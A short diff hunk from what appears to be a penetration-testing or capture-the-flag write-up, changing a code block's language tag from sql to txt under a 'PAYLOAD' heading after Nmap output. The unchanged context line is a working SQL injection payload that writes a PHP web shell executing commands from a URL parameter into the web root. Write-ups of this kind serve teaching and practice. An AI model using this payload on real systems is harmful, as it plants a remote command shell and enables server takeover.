@@ -91,7 +91,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.37 seconds
 
 > PAYLOAD
 
-```sql
+```txt
 ' UNION SELECT "<?php SYSTEM($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
 ```
 
